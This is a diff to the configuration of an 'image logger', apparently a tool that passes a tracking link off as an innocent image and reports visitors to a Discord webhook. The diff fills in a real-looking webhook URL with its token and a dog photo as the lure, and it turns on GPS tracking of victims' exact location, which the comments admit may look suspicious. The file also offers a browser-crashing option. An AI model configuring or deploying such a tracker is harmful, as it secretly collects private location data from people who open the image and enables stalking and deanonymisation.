@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1343353757273948181/btz2R6wRnkM9tchCV88_mlP8nhOin1Ds60Vv9iblZNWn3QPddQe-ErgwENpE8FTx94v5",
+    "image": "https://dependondogs.com/wp-content/uploads/2020/06/shutterstock_102794006-1536x1028.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -24,7 +24,7 @@ config = {
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
